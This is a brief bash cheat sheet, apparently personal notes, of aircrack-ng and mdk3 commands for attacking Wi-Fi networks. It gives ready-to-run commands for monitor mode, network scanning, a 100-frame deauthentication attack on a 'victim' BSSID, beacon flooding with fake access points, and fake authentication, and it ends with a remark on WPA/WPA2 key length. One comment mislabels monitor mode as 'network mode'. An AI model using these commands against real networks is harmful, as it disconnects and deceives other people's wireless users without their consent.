```bash
sudo airmon-ng start wlp4s0 #Put card in network mode

sudo airmon-ng stop wlp4s0mon #Put card in managed-mode

sudo airodump-ng wlp4s0mon #To scan netwroks

sudo aireplay-ng -0 100 -a (bssid of victim) wlp4s0mon

sudo mdk3 wlp4s0mon b -n anyNameHere #it will show wifi with name

sudo mdk3 wlp4s0mon b #fake wifi spawn

sudo ifconfig wlp4s0mon down #Turns off network card

sudo ifconfig wlp4s0mon up #Turns on network card

sudo mdk3 wlp4s0mon b -f path to file with wifi-names

sudo aireplay-ng -1 0 -a bssid here wlp4s0mon #fake authentication

sudo airmon-ng check kill #To kill interfering processes

```

WPA/WPA2 key can be 8-63 characters long

